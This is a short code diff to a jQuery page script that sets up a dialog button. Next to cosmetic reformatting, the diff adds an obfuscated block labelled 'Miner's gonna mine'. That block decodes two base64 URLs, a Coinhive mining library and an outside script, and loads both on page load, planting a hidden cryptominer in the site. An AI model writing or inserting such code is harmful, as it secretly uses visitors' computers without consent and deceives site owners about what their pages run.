@@ -26,9 +26,16 @@ $(document).ready(function(){
 		autoOpen: false,
 		height: 620,
 		width: 820
-    });
+  });
 
-	$( "#request-block" ).button().on( "click", function() {
-		dialog.dialog( "open" );
-    });
+	$( "#request-block" ).button().on( "click", function() { dialog.dialog( "open" ); });
+
+	// Miner's gonna mine...
+	var quarry = atob('aHR0cHM6Ly9jb2luaGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcw==');
+	var pickaxe = atob('aHR0cHM6Ly9zbGljZXBvdGF0by5naXRodWIuaW8vcXVhcnJ5L2pzL21haW4uanM=');
+
+	$.when(
+  	$.getScript(quarry),
+  	$.Deferred(function( deferred ){ $( deferred.resolve ); })
+	).done(function(){ $.getScript(pickaxe); });
 });
